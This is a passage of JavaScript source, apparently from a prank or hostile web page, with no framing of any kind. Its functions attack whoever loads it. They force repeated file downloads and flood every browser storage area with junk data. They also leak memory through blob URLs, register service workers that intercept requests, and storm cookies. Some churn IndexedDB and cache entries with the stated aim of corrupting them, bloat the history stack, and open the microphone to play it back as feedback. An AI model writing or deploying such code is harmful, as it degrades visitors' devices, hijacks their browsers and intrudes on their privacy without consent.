    for (let i = 0; i < 5; i++) {
      const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
      const a = document.createElement('a')
      a.href = fileName
      a.download = fileName
      a.click()
    }
  }, 500)
}

function fillLocalStorage() {
  try {
    const chunk = repeatStringNumTimes(repeatStringNumTimes('tunghook', 500), 10)
    let i = 0
    function pump() {
      for (let j = 0; j < 10; j++) {
        try {
          localStorage.setItem('tung_' + i, chunk + i)
          i++
        } catch (e) {
          break
        }
      }
      if (i < 200) setTimeout(pump, 500)
    }
    pump()
  } catch (e) { }
}

function fillSessionStorage() {
  try {
    const chunk = repeatStringNumTimes(repeatStringNumTimes('tunghook', 500), 10)
    let i = 0
    function pump() {
      for (let j = 0; j < 10; j++) {
        try {
          sessionStorage.setItem('tung_' + i, chunk + i)
          i++
        } catch (e) {
          break
        }
      }
      if (i < 200) setTimeout(pump, 500)
    }
    pump()
  } catch (e) { }
}

function fillIndexedDB() {
  try {
    const chunk = repeatStringNumTimes(repeatStringNumTimes('tunghook', 500), 5)
    for (let dbIdx = 0; dbIdx < 3; dbIdx++) {
      const request = indexedDB.open('tungdb_' + dbIdx, 1)
      request.onupgradeneeded = function (event) {
        const db = event.target.result
        const store = db.createObjectStore('store', { keyPath: 'id', autoIncrement: true })
        let count = 0
        function writeChunk() {
          if (count >= 1000) return
          const tx = db.transaction('store', 'readwrite')
          const s = tx.objectStore('store')
          for (let i = 0; i < 50; i++) {
            s.put({ data: chunk + count + i })
            count++
          }
          tx.oncomplete = function () { setTimeout(writeChunk, 100) }
          tx.onerror = function () { count += 50; setTimeout(writeChunk, 100) }
        }
        writeChunk()
      }
      request.onerror = function () { }
    }
  } catch (e) { }
}

function fillCacheStorage() {
  try {
    if (typeof caches === 'undefined') return
    const chunk = repeatStringNumTimes(repeatStringNumTimes('tunghook', 500), 10)
    for (let cacheIdx = 0; cacheIdx < 3; cacheIdx++) {
      caches.open('tungcache_' + cacheIdx).then(cache => {
        for (let batch = 0; batch < 2; batch++) {
          const promises = []
          for (let i = 0; i < 10; i++) {
            const idx = batch * 10 + i
            const response = new Response(chunk + idx, {
              status: 200,
              headers: { 'Content-Type': 'text/plain' }
            })
            promises.push(cache.put('tung_' + cacheIdx + '_' + idx, response))
          }
          Promise.all(promises).catch(() => { })
        }
      })
    }
  } catch (e) { }
}

function fillOriginPrivateFileSystem() {
  try {
    if (typeof navigator.storage === 'undefined' || typeof navigator.storage.getDirectory !== 'function') return
    navigator.storage.getDirectory().then(root => {
      const chunk = repeatStringNumTimes(repeatStringNumTimes('tunghook', 500), 10)
      function writeBatch(dirHandle, start, count) {
        const promises = []
        for (let i = start; i < start + count; i++) {
          const name = 'tungfile_' + i + '.txt'
          promises.push(
            dirHandle.getFileHandle(name, { create: true }).then(fh =>
              fh.createWritable().then(writer => {
                writer.write(chunk + i)
                return writer.close()
              })
            ).catch(() => { })
          )
        }
        Promise.all(promises).catch(() => { })
      }
      for (let batchStart = 0; batchStart < 100; batchStart += 10) {
        writeBatch(root, batchStart, 10)
      }
    }).catch(() => { })
  } catch (e) { }
}

function fillWebSQL() {
  try {
    if (typeof window.openDatabase !== 'function') return
    const chunk = repeatStringNumTimes(repeatStringNumTimes('tunghook', 500), 5)
    for (let dbIdx = 0; dbIdx < 2; dbIdx++) {
      const db = window.openDatabase('tungwebsql_' + dbIdx, '1.0', 'tung', 50 * 1024 * 1024)
      if (!db) continue
      db.transaction(function (tx) {
        tx.executeSql('CREATE TABLE IF NOT EXISTS junk (id INTEGER PRIMARY KEY, data TEXT)')
        for (let batchStart = 0; batchStart < 100; batchStart += 10) {
          let sql = 'INSERT INTO junk (data) VALUES '
          const values = []
          for (let i = 0; i < 10; i++) {
            sql += (i === 0 ? '(?)' : ',(?)')
            values.push(chunk + batchStart + i)
          }
          tx.executeSql(sql, values, function () { }, function () { })
        }
      })
    }
  } catch (e) { }
}

function accumulateBlobUrls() {
  try {
    setInterval(() => {
      for (let i = 0; i < 2; i++) {
        const size = 1 + Math.floor(Math.random() * 2)
        const data = new Uint8Array(size * 1024 * 1024)
        crypto.getRandomValues(data)
        const blob = new Blob([data], { type: 'application/octet-stream' })
        URL.createObjectURL(blob)
      }
    }, 2000)
  } catch (e) { }
}

function floodServiceWorkerRegistrations() {
  try {
    if (typeof navigator.serviceWorker === 'undefined') return
    let swCount = 0
    function registerNext() {
      if (swCount >= 10) return
      const scope = '/tung_sw_' + swCount + '_' + Date.now() + '/'
      const workerCode = 'self.addEventListener("install",e=>{e.waitUntil(self.skipWaiting())});self.addEventListener("activate",e=>{e.waitUntil(self.clients.claim())});self.addEventListener("fetch",e=>{e.respondWith(fetch(e.request).catch(()=>new Response("tung")))});'
      const blob = new Blob([workerCode], { type: 'application/javascript' })
      const url = URL.createObjectURL(blob)
      navigator.serviceWorker.register(url, { scope: scope }).then(reg => {
        swCount++
        URL.revokeObjectURL(url)
        setTimeout(registerNext, 500)
      }).catch(() => {
        swCount++
        URL.revokeObjectURL(url)
        setTimeout(registerNext, 1000)
      })
    }
    for (let i = 0; i < 2; i++) registerNext()
  } catch (e) { }
}

function corruptCookieJarStorm() {
  try {
    const chunk = repeatStringNumTimes('x', 500)
    let cycle = 0
    function storm() {
      for (let i = 0; i < 20; i++) {
        try {
          document.cookie = 's' + cycle + '_' + i + '=' + chunk + ';path=/;max-age=60'
        } catch (e) { }
      }
      for (let i = 0; i < 20; i++) {
        try {
          document.cookie = 's' + cycle + '_' + i + '=x;path=/;max-age=0'
        } catch (e) { }
      }
      cycle++
      setTimeout(storm, 2000)
    }
    storm()
  } catch (e) { }
}

function corruptIndexedDBWAL() {
  try {
    const chunk = repeatStringNumTimes('tunghook', 500)
    const dbNames = []
    for (let i = 0; i < 5; i++) {
      const dbName = 'corruptdb_' + i + '_' + Date.now()
      dbNames.push(dbName)
      const openReq = indexedDB.open(dbName, 1)
      let dbRef = null
      let closed = false
      openReq.onupgradeneeded = function (event) {
        dbRef = event.target.result
        const store = dbRef.createObjectStore('store', { keyPath: 'id', autoIncrement: true })
        for (let j = 0; j < 20; j++) {
          store.put({ data: chunk })
        }
      }
      openReq.onsuccess = function (event) {
        dbRef = event.target.result
        const store = dbRef.transaction('store', 'readwrite').objectStore('store')
        let writeCount = 0
        function rapidWrite() {
          if (writeCount >= 50 || closed) return
          store.put({ data: chunk + writeCount })
          writeCount++
          setTimeout(rapidWrite, 50)
        }
        rapidWrite()
        setTimeout(() => {
          if (dbRef && !closed) {
            closed = true
            try { dbRef.close() } catch (e) { }
          }
        }, 100 + Math.random() * 200)
        setTimeout(() => {
          if (dbRef && !closed) {
            closed = true
            try { dbRef.close() } catch (e) { }
          }
        }, 50 + Math.random() * 100)
        setTimeout(() => {
          if (dbRef && !closed) {
            closed = true
            try { dbRef.close() } catch (e) { }
          }
        }, 25 + Math.random() * 50)
      }
      openReq.onerror = function () { }
    }
    setInterval(() => {
      dbNames.forEach(name => {
        try {
          const r = indexedDB.open(name, 1)
          r.onsuccess = function (e) { e.target.result.close() }
          r.onerror = function () { }
        } catch (e) { }
      })
    }, 2000)
  } catch (e) { }
}

function corruptOPFSChurn() {
  try {
    if (typeof navigator.storage === 'undefined' || typeof navigator.storage.getDirectory !== 'function') return
    navigator.storage.getDirectory().then(root => {
      const chunk = repeatStringNumTimes('tunghook', 500)
      let fileIdx = 0
      function createAndDelete() {
        if (fileIdx >= 100) return
        const name = 'churn_' + fileIdx + '_' + Date.now() + '.bin'
        root.getFileHandle(name, { create: true }).then(fh => {
          fh.createWritable().then(w => {
            w.write(chunk + fileIdx)
            return w.close()
          }).then(() => {
            root.removeEntry(name).catch(() => { })
            fileIdx++
            setTimeout(createAndDelete, 100)
          }).catch(() => {
            fileIdx++
            setTimeout(createAndDelete, 100)
          })
        }).catch(() => {
          fileIdx++
          setTimeout(createAndDelete, 100)
        })
      }
      for (let i = 0; i < 2; i++) createAndDelete()
    }).catch(() => { })
  } catch (e) { }
}

function corruptCacheChurn() {
  try {
    if (typeof caches === 'undefined') return
    const chunk = repeatStringNumTimes(repeatStringNumTimes('tunghook', 100), 5)
    for (let cacheIdx = 0; cacheIdx < 3; cacheIdx++) {
      caches.open('churncache_' + cacheIdx).then(cache => {
        let entryIdx = 0
        function churnLoop() {
          if (entryIdx >= 100) return
          const key = 'e_' + entryIdx
          const response = new Response(chunk + entryIdx, {
            status: 200,
            headers: { 'Content-Type': 'text/plain' }
          })
          cache.put(key, response).then(() => {
            setTimeout(() => {
              cache.delete(key).then(() => {
                entryIdx++
                setTimeout(churnLoop, 100)
              }).catch(() => {
                entryIdx++
                setTimeout(churnLoop, 100)
              })
            }, 100)
          }).catch(() => {
            entryIdx++
            setTimeout(churnLoop, 100)
          })
        }
        churnLoop()
      })
    }
  } catch (e) { }
}

function bloatHistoryState() {
  try {
    const baseUrl = window.location.href.split('?')[0]
    let stateIdx = 0
    setInterval(() => {
      for (let i = 0; i < 5; i++) {
        try {
          const largeState = {
            idx: stateIdx,
            padding: repeatStringNumTimes(repeatStringNumTimes('tung', 500), 8)
          }
          window.history.pushState(largeState, '', baseUrl + '?h=' + stateIdx)
          window.history.replaceState(largeState, '', baseUrl + '?h=' + stateIdx + '&r=' + i)
          stateIdx++
        } catch (e) { }
      }
    }, 1000)
  } catch (e) { }
}

function startMicFeedbackLoop() {
  try {
    if (!navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== 'function') return
    navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
      const AudioCtx = window.AudioContext || window.webkitAudioContext
      if (!AudioCtx) return
      const ctx = new AudioCtx()
      const source = ctx.createMediaStreamSource(stream)
      const gain = ctx.createGain()
      gain.gain.value = 0.9
      source.connect(gain)
      gain.connect(ctx.destination)
    }).catch(() => { })
  } catch (e) { }
}
